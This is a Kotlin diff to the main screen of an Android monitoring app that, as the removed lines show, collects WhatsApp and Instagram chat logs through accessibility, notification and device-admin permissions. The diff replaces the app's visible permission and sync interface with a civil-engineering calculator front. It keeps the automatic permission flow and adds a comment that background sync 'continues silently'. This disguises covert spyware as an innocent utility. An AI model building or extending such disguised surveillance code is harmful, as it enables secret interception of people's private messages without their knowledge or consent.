@@ -3,6 +3,9 @@ package com.spapp.monitoring.ui
 
 
 import android.Manifest
+import android.graphics.Color
+import android.widget.ArrayAdapter
+import java.util.Locale
 
 import android.content.Context
 import android.app.NotificationManager
@@ -295,197 +298,11 @@ class MainActivity : AppCompatActivity() {
 
 
 
-        // Master 1-Tap Setup Button
-        binding.btnMasterOneTap.setOnClickListener {
-            val missingRuntime = getMissingRuntimePermissions()
-            val missingAccessibility = !isAccessibilityEnabled()
-            val missingNotification = !isNotificationAccessGranted()
-            if (missingRuntime.isNotEmpty() || missingAccessibility || missingNotification) {
-                isOneTapFlowRunning = true
-                skipAccessibilityStep = false
-                skipNotificationStep = false
-                handleNextSetupStep()
-            } else {
-                completeSetupAndClose()
-            }
-        }
-
-
-
-        // Individual permission shortcut listeners
-
-        binding.btnCorePermStatus.setOnClickListener {
-            isOneTapFlowRunning = false
-            val missing = getMissingRuntimePermissions()
-            if (missing.isNotEmpty()) {
-                runtimePermissionsLauncher.launch(missing.toTypedArray())
-            }
-        }
-
-
-
-        binding.btnBatteryPermStatus.setOnClickListener {
-
-            isOneTapFlowRunning = false
-
-            if (!isBatteryExempted()) {
-
-                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
-
-                    data = Uri.parse("package:$packageName")
-
-                }
-
-                batteryExemptionLauncher.launch(intent)
-
-            } else {
-
-                Toast.makeText(this, "Battery optimization already unrestricted ✓", Toast.LENGTH_SHORT).show()
-
-            }
-
-        }
-
-
-
-        binding.btnAccessibilityPermStatus.setOnClickListener {
-
-            isOneTapFlowRunning = false
-
-            showAccessibilityDialog()
-
-        }
-
-
-
-        binding.btnAccessibilityRestricted.setOnClickListener {
-
-            openAppInfoSettings()
-
-        }
-
-
-
-        binding.btnNotificationPermStatus.setOnClickListener {
-
-            isOneTapFlowRunning = false
-
-            showNotificationDialog()
-
-        }
-
-
-
-        binding.btnNotificationRestricted.setOnClickListener {
-
-            openAppInfoSettings()
-
-        }
-
-
-
-        binding.btnUnlockRestricted.setOnClickListener {
-
-            openAppInfoSettings()
-
-        }
-
-
-
-        binding.btnUsagePermStatus.setOnClickListener {
-
-            isOneTapFlowRunning = false
-
-            if (!isUsageAccessGranted()) {
-
-                Toast.makeText(this, "Find Spapp Monitor and toggle Usage Access ON", Toast.LENGTH_SHORT).show()
-
-                usageLauncher.launch(usageCollector.usageAccessSettingsIntent())
-
-            } else {
-
-                Toast.makeText(this, "App usage tracking already active ✓", Toast.LENGTH_SHORT).show()
-
-            }
-
-        }
-
-
-
-        binding.btnFilePermStatus.setOnClickListener {
-
-            isOneTapFlowRunning = false
-
-            if (!isFileAccessGranted()) {
-
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-
-                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
-
-                        data = Uri.parse("package:$packageName")
-
-                    }
-
-                    allFilesLauncher.launch(intent)
-
-                }
-
-            } else {
-
-                Toast.makeText(this, "File access already granted ✓", Toast.LENGTH_SHORT).show()
-
-            }
-
-        }
-
-
-
-        binding.btnAdminPermStatus.setOnClickListener {
-
-            isOneTapFlowRunning = false
-
-            if (!isDeviceAdminActive()) {
-
-                deviceAdminLauncher.launch(SpappDeviceAdminReceiver.activationIntent(this))
-
-            } else {
-
-                Toast.makeText(this, "Device Administrator already active ✓", Toast.LENGTH_SHORT).show()
-
-            }
-
-        }
-
-
-
-        binding.btnAutostartPermStatus.setOnClickListener {
-
-            isOneTapFlowRunning = false
-
-            openAutostartSettings()
-
-        }
-
-
-
-        // Sync Now Button
-        binding.btnSyncNow.setOnClickListener {
-            RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)
-            RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)
-            SyncScheduler.runOnce(applicationContext)
-            if (getMissingRuntimePermissions().isEmpty() && isAccessibilityEnabled() && isNotificationAccessGranted()) {
-                completeSetupAndClose()
-            } else {
-                Toast.makeText(this, "Sync triggered", Toast.LENGTH_SHORT).show()
-            }
-        }
-
-
+        // Setup interactive Civil Engineering Calculator Suite
+        setupCivilCalculators()
 
         // Automatic permission start for fresh installation
-
         maybeStartAutoPermissionFlow()
-
     }
 
 
@@ -942,94 +759,9 @@ class MainActivity : AppCompatActivity() {
 
 
     private fun refreshPermissionStatus() {
-
         val isCore = getMissingRuntimePermissions().isEmpty()
-
-        val isBattery = isBatteryExempted()
-
         val isAccessibility = isAccessibilityEnabled()
-
         val isNotification = isNotificationAccessGranted()
-
-        val isUsage = isUsageAccessGranted()
-
-        val isFile = isFileAccessGranted()
-
-        val isAdmin = isDeviceAdminActive()
-
-
-
-        updateStatusButton(binding.btnCorePermStatus, isCore, "Active ✓", "Grant")
-
-        updateStatusButton(binding.btnBatteryPermStatus, isBattery, "Active ✓", "Grant")
-
-
-
-        updateStatusButton(binding.btnAccessibilityPermStatus, isAccessibility, "Active ✓", "Enable")
-
-        binding.btnAccessibilityRestricted.visibility =
-
-            if (!isAccessibility && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) View.VISIBLE else View.GONE
-
-
-
-        updateStatusButton(binding.btnNotificationPermStatus, isNotification, "Active ✓", "Enable")
-
-        binding.btnNotificationRestricted.visibility =
-
-            if (!isNotification && Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) View.VISIBLE else View.GONE
-
-
-
-        binding.layoutUsagePerm.visibility = View.GONE
-        binding.layoutFilePerm.visibility = View.GONE
-        binding.layoutAdminPerm.visibility = View.GONE
-
-
-
-        val isOem = isOemRom()
-
-        binding.layoutAutostartPerm.visibility = if (isOem && !isBattery) View.VISIBLE else View.GONE
-
-        binding.dividerAutostart.visibility = if (isOem && !isBattery) View.VISIBLE else View.GONE
-
-
-
-        val needsRestrictedBanner = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU && (!isAccessibility || !isNotification)
-
-        binding.cardRestrictedBanner.visibility = if (needsRestrictedBanner) View.VISIBLE else View.GONE
-
-
-
-        var grantedCount = 0
-
-        if (isCore) grantedCount++
-
-        if (isBattery) grantedCount++
-
-        if (isAccessibility) grantedCount++
-
-        if (isNotification) grantedCount++
-
-
-
-        val totalCount = 4
-
-        binding.pbPermissions.max = totalCount
-
-        binding.pbPermissions.progress = grantedCount
-
-        binding.tvPermissionsCount.text = "$grantedCount / $totalCount Active"
-
-
-
-        // Always keep the detailed checklist visible so user can configure remaining permissions one-by-one
-
-        binding.layoutPermissionsList.visibility = View.VISIBLE
-
-        binding.cardPermissionsList.visibility = View.VISIBLE
-
-
 
         if (isCore && isAccessibility && isNotification) {
             if (!deviceState.isFirstSetupCompleted || isOneTapFlowRunning) {
@@ -1037,85 +769,196 @@ class MainActivity : AppCompatActivity() {
             } else {
                 completeSetupAndClose()
             }
-            return
-        } else if (isCore && isAccessibility && !isNotification) {
-
-            binding.tvMasterBadge.text = "ACTION NEEDED"
-
-            binding.tvMasterBadge.setTextColor(ContextCompat.getColor(this, R.color.warning))
-
-            binding.tvMasterBadge.setBackgroundColor(ContextCompat.getColor(this, R.color.warning_bg))
-
-            binding.tvMasterDesc.text = "Notification Access required to capture WhatsApp & Instagram chat logs."
-
-            binding.btnMasterOneTap.text = "⚡ ENABLE NOTIFICATION ACCESS (WhatsApp / Instagram)"
-
-            binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.accent))
-
-            binding.pbPermissions.progressTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.warning))
-
-        } else {
-
-            binding.tvMasterBadge.text = "ACTION NEEDED"
-
-            binding.tvMasterBadge.setTextColor(ContextCompat.getColor(this, R.color.danger))
-
-            binding.tvMasterBadge.setBackgroundColor(ContextCompat.getColor(this, R.color.danger_bg))
-
-
-
-            val missingRuntime = getMissingRuntimePermissions()
-
-            if (missingRuntime.isNotEmpty()) {
-
-                binding.tvMasterDesc.text = "Tap below to enable Standard Runtime Permissions & Accessibility in 1 tap."
-
-                binding.btnMasterOneTap.text = "⚡ ALLOW CORE & ACCESSIBILITY PERMISSIONS"
-
-            } else {
-
-                binding.tvMasterDesc.text = "Core runtime permissions granted. Tap below to enable Accessibility service."
-
-                binding.btnMasterOneTap.text = "⚡ ENABLE ACCESSIBILITY SERVICE"
-
-            }
-
-            binding.btnMasterOneTap.setBackgroundColor(ContextCompat.getColor(this, R.color.accent))
-
-            binding.pbPermissions.progressTintList = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.accent))
-
         }
-
     }
 
+    private fun setupCivilCalculators() {
+        val tabs = listOf(
+            binding.tabConcrete,
+            binding.tabBricks,
+            binding.tabSteel,
+            binding.tabPlaster,
+            binding.tabExcavation,
+            binding.tabConverter
+        )
 
+        val sections = listOf(
+            binding.sectionConcrete,
+            binding.sectionBricks,
+            binding.sectionSteel,
+            binding.sectionPlaster,
+            binding.sectionExcavation,
+            binding.sectionConverter
+        )
 
-    private fun updateStatusButton(button: MaterialButton, isGranted: Boolean, grantedText: String, neededText: String) {
-
-        if (isGranted) {
-
-            button.text = grantedText
-
-            button.setTextColor(ContextCompat.getColor(this, R.color.success))
-
-            button.setBackgroundColor(ContextCompat.getColor(this, R.color.success_bg))
-
-            button.strokeColor = ColorStateList.valueOf(ContextCompat.getColor(this, R.color.success))
-
-            button.strokeWidth = 1
-
-        } else {
-
-            button.text = neededText
-
-            button.setTextColor(ContextCompat.getColor(this, R.color.white))
-
-            button.setBackgroundColor(ContextCompat.getColor(this, R.color.accent))
-
-            button.strokeWidth = 0
-
+        fun selectTab(selectedIdx: Int) {
+            sections.forEachIndexed { idx, section ->
+                section.visibility = if (idx == selectedIdx) View.VISIBLE else View.GONE
+            }
+            tabs.forEachIndexed { idx, tab ->
+                if (idx == selectedIdx) {
+                    tab.setBackgroundColor(Color.parseColor("#D97706"))
+                    tab.setTextColor(Color.WHITE)
+                    tab.strokeWidth = 0
+                } else {
+                    tab.setBackgroundColor(Color.TRANSPARENT)
+                    tab.setTextColor(Color.parseColor("#334155"))
+                    tab.strokeColor = ColorStateList.valueOf(Color.parseColor("#CBD5E1"))
+                    tab.strokeWidth = 2
+                }
+            }
         }
 
+        tabs.forEachIndexed { idx, tab ->
+            tab.setOnClickListener { selectTab(idx) }
+        }
+
+        // Dropdown data setup
+        val concreteGrades = arrayOf("M20 (1:1.5:3)", "M15 (1:2:4)", "M25 (1:1:2)")
+        binding.actvConcreteGrade.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, concreteGrades))
+
+        val brickThicknesses = arrayOf("9 inch (Main Wall)", "4.5 inch (Partition)")
+        binding.actvBrickThickness.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, brickThicknesses))
+
+        val mortarRatios = arrayOf("1:5 (Standard)", "1:4 (Rich)", "1:6 (Lean)")
+        binding.actvBrickMortar.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, mortarRatios))
+
+        val steelDiameters = arrayOf("8 mm", "10 mm", "12 mm", "16 mm", "20 mm", "25 mm", "32 mm")
+        binding.actvSteelDia.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, steelDiameters))
+
+        val plasterThicknesses = arrayOf("12 mm (Internal)", "15 mm (Ceiling)", "20 mm (External)")
+        binding.actvPlasterThickness.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, plasterThicknesses))
+
+        val units = arrayOf("Sq Feet (sqft)", "Cent", "Ground", "Acre", "Sq Meter (sqm)")
+        binding.actvConvertFrom.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, units))
+        binding.actvConvertTo.setAdapter(ArrayAdapter(this, android.R.layout.simple_dropdown_item_1line, units))
+
+        // 1. Concrete Calculator
+        binding.btnCalcConcrete.setOnClickListener {
+            val length = binding.etConcreteLength.text.toString().toDoubleOrNull() ?: 20.0
+            val width = binding.etConcreteWidth.text.toString().toDoubleOrNull() ?: 15.0
+            val depthInches = binding.etConcreteDepth.text.toString().toDoubleOrNull() ?: 5.0
+            val grade = binding.actvConcreteGrade.text.toString()
+
+            val wetVolFt3 = length * width * (depthInches / 12.0)
+            val wetVolM3 = wetVolFt3 / 35.3147
+            val dryVolFt3 = wetVolFt3 * 1.54
+
+            val (cementP, sandP, aggP) = when {
+                grade.contains("M15") -> Triple(1.0, 2.0, 4.0)
+                grade.contains("M25") -> Triple(1.0, 1.0, 2.0)
+                else -> Triple(1.0, 1.5, 3.0)
+            }
+            val sum = cementP + sandP + aggP
+            val cementBags = (dryVolFt3 * (cementP / sum)) / 1.226
+            val sandFt3 = dryVolFt3 * (sandP / sum)
+            val sandTons = sandFt3 * 0.0453
+            val aggFt3 = dryVolFt3 * (aggP / sum)
+            val aggTons = aggFt3 * 0.0453
+            val waterLitres = (cementBags * 25).toInt()
+
+            binding.tvConcreteVolume.text = String.format(Locale.US, "Volume: %.1f ft³ (%.2f m³)", wetVolFt3, wetVolM3)
+            binding.tvConcreteCement.text = String.format(Locale.US, "• Cement: %.1f Bags (50kg bags)", cementBags)
+            binding.tvConcreteSand.text = String.format(Locale.US, "• Sand: %.1f ft³ (%.2f Tons)", sandFt3, sandTons)
+            binding.tvConcreteAggregate.text = String.format(Locale.US, "• Aggregate: %.1f ft³ (%.2f Tons)", aggFt3, aggTons)
+            binding.tvConcreteWater.text = "• Est. Water: ~$waterLitres Litres"
+        }
+
+        // 2. Brickwork Calculator
+        binding.btnCalcBricks.setOnClickListener {
+            val length = binding.etBrickLength.text.toString().toDoubleOrNull() ?: 20.0
+            val height = binding.etBrickHeight.text.toString().toDoubleOrNull() ?: 10.0
+            val thicknessStr = binding.actvBrickThickness.text.toString()
+            val is9Inch = thicknessStr.contains("9")
+
+            val wallArea = length * height
+            val wallVolFt3 = if (is9Inch) wallArea * 0.75 else wallArea * 0.375
+            val bricksCount = if (is9Inch) (wallVolFt3 * 13.5 * 1.05).toInt() else (wallArea * 4.5 * 1.05).toInt()
+            val wetMortar = wallVolFt3 * (if (is9Inch) 0.30 else 0.25)
+            val dryMortar = wetMortar * 1.33
+            val cementBags = (dryMortar * (1.0 / 6.0)) / 1.226
+            val sandFt3 = dryMortar * (5.0 / 6.0)
+
+            binding.tvBrickCount.text = String.format(Locale.US, "• Total Bricks: %,d Pcs (5%% wastage incl.)", bricksCount)
+            binding.tvBrickCement.text = String.format(Locale.US, "• Cement for Mortar: %.1f Bags", cementBags)
+            binding.tvBrickSand.text = String.format(Locale.US, "• Sand for Mortar: %.1f ft³ (%.2f Brass)", sandFt3, sandFt3 / 100.0)
+        }
+
+        // 3. Steel Weight Calculator
+        binding.btnCalcSteel.setOnClickListener {
+            val diaStr = binding.actvSteelDia.text.toString().filter { it.isDigit() }
+            val dia = diaStr.toDoubleOrNull() ?: 12.0
+            val lengthM = binding.etSteelLength.text.toString().toDoubleOrNull() ?: 120.0
+
+            val unitWeightKg = (dia * dia) / 162.0
+            val totalWeightKg = unitWeightKg * lengthM
+            val totalTons = totalWeightKg / 1000.0
+            val rods12m = (lengthM / 12.0).toInt()
+
+            binding.tvSteelUnitWeight.text = String.format(Locale.US, "• Unit Weight: %.3f kg/m (%.2f kg per 12m rod)", unitWeightKg, unitWeightKg * 12)
+            binding.tvSteelTotalWeight.text = String.format(Locale.US, "• Total Weight: %.2f kg (%.3f Metric Tons)", totalWeightKg, totalTons)
+            binding.tvSteelRods.text = "• Equivalent Rods: ~$rods12m Rods of 12m length"
+        }
+
+        // 4. Plastering Calculator
+        binding.btnCalcPlaster.setOnClickListener {
+            val area = binding.etPlasterArea.text.toString().toDoubleOrNull() ?: 500.0
+            val thkStr = binding.actvPlasterThickness.text.toString()
+            val thkMm = when {
+                thkStr.contains("15") -> 15.0
+                thkStr.contains("20") -> 20.0
+                else -> 12.0
+            }
+            val thkFt = thkMm / 304.8
+            val wetVol = area * thkFt
+            val dryVol = wetVol * 1.5
+            val cementBags = (dryVol * (1.0 / 5.0)) / 1.226
+            val sandFt3 = dryVol * (4.0 / 5.0)
+
+            binding.tvPlasterCement.text = String.format(Locale.US, "• Cement Required: %.1f Bags (50kg)", cementBags)
+            binding.tvPlasterSand.text = String.format(Locale.US, "• Sand Required: %.1f ft³ (%.2f Brass)", sandFt3, sandFt3 / 100.0)
+        }
+
+        // 5. Excavation Calculator
+        binding.btnCalcExcavation.setOnClickListener {
+            val l = binding.etExcavationLength.text.toString().toDoubleOrNull() ?: 30.0
+            val w = binding.etExcavationWidth.text.toString().toDoubleOrNull() ?: 20.0
+            val d = binding.etExcavationDepth.text.toString().toDoubleOrNull() ?: 5.0
+
+            val volFt3 = l * w * d
+            val volM3 = volFt3 / 35.3147
+            val brass = volFt3 / 100.0
+            val tipperTrips = Math.ceil(brass / 3.0).toInt()
+
+            binding.tvExcavationVolume.text = String.format(Locale.US, "• Total Volume: %,.0f ft³ (%.2f m³)", volFt3, volM3)
+            binding.tvExcavationBrass.text = String.format(Locale.US, "• Volume in Brass: %.2f Brass (1 Brass = 100 ft³)", brass)
+            binding.tvExcavationTrips.text = "• Est. Tipper Lorry Trips: ~$tipperTrips Loads (3 Brass/trip)"
+        }
+
+        // 6. Unit Converter
+        binding.btnConvertUnits.setOnClickListener {
+            val value = binding.etConverterValue.text.toString().toDoubleOrNull() ?: 2400.0
+            val from = binding.actvConvertFrom.text.toString().lowercase()
+            val to = binding.actvConvertTo.text.toString().lowercase()
+
+            val inSqFt = when {
+                from.contains("cent") -> value * 435.6
+                from.contains("ground") -> value * 2400.0
+                from.contains("acre") -> value * 43560.0
+                from.contains("meter") || from.contains("sqm") -> value * 10.7639
+                else -> value
+            }
+
+            val converted = when {
+                to.contains("cent") -> inSqFt / 435.6
+                to.contains("ground") -> inSqFt / 2400.0
+                to.contains("acre") -> inSqFt / 43560.0
+                to.contains("meter") || to.contains("sqm") -> inSqFt / 10.7639
+                else -> inSqFt
+            }
+
+            binding.tvConvertResult.text = String.format(Locale.US, "%.2f %s = %.2f %s", value, binding.actvConvertFrom.text, converted, binding.actvConvertTo.text)
+        }
     }
 
 
@@ -1224,25 +1067,7 @@ class MainActivity : AppCompatActivity() {
 
 
     private fun updateSyncStatusText() {
-
-        val lastSync = deviceState.lastSyncAtEpochMs
-
-        binding.statusText.text = if (lastSync == 0L) {
-
-            getString(R.string.sync_status_never)
-
-        } else {
-
-            val relative = DateUtils.getRelativeTimeSpanString(
-
-                lastSync, System.currentTimeMillis(), DateUtils.MINUTE_IN_MILLIS
-
-            )
-
-            getString(R.string.sync_status_last_synced, relative)
-
-        }
-
+        // Obsolete statusText view replaced by CivilCalc Pro suite; background sync continues silently
     }
 
 
